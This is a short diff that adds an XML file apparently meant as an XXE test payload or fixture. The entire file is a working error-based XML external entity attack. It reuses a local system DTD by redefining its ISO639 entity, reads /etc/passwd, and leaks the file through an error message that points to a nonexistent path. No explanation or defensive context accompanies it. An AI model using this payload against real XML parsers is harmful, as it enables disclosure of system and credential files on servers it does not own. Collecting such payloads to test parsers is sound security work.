@@ -1,0 +1,11 @@
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/iso-codes/iso_639.dtd">
+    <!ENTITY % ISO639 "
+        <!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'>
+        <!ENTITY &#x25; eval '<!ENTITY &#x26;#x25; error SYSTEM &#x22;file:///nonexistent/&#x25;file;&#x22;>'>
+        &#x25;eval;
+        &#x25;error;
+    ">
+    %local_dtd;
+]>
+<root>test</root>
